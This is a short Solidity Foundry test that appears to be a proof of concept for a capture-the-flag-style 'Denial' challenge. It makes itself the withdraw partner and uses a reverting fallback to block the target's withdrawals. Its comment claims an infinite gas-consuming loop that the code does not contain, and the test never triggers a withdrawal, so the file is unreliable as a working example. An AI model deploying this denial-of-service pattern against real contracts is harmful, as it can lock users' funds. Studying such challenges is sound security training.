// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Denial} from "src/Denial.sol";

contract Denial_POC is Test {
    Denial _denial;
    function init() private{
        vm.startPrank(address(0x10));
        _denial = new Denial();
        vm.stopPrank();
        payable(address(_denial)).transfer(1 ether);
    }
    function setUp() public {
        init();
    }

    function test_Denial_POC() public{
        _denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        revert("fail!");  // Infinite loop to consume gas
    }
}
